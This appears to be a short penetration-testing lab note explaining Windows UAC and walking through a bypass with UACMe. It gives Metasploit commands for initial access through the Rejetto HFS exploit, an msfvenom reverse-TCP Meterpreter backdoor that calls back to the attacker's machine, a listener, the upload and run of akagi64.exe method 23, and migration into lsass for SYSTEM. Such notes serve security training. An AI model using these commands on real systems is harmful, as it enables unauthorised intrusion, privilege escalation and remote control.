**Bypassing UAC with UACMe**

**What is UAC?**

- Windows security feature (Vista onwards) — prompts before any admin-level action
- **Consent prompt** → user is in local admins group
- **Credential prompt** → standard user, needs admin password
- Default level = not highest → bypassable

**Requirement to bypass:** Account must be in **local administrators group** (not NT SYSTEM — just local admin)

---

**Attack Flow**

**1. Gain initial access (HFS exploit example)**

```bash
service postgresql start && msfconsole
search rejetto
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <target-ip>
exploit
```

**2. Basic enumeration (Meterpreter)**

```bash
sysinfo
getuid
getprivs

# Migrate to 64-bit process
pgrep explorer
migrate <PID>

# Verify user is in local admins group
shell
net localgroup administrators
```

**3. Generate payload (new tab on Kali)**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali-ip> LPORT=1234 -f exe -o backdoor.exe
```

**4. Set up listener**

```bash
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <kali-ip>
set LPORT 1234
run
```

**5. Upload both files to target**

```bash
# Back in original Meterpreter session
mkdir C:\\Temp
cd C:\\Temp
upload backdoor.exe
upload /path/to/akagi64.exe
```

**6. Bypass UAC & execute payload**

```bash
shell
akagi64.exe 23 C:\Temp\backdoor.exe
```

**7. On new elevated Meterpreter session**

```bash
getprivs          # now elevated
ps                # find NT AUTHORITY\SYSTEM process
migrate <lsass-PID>
getuid            # → NT AUTHORITY\SYSTEM ✓
```
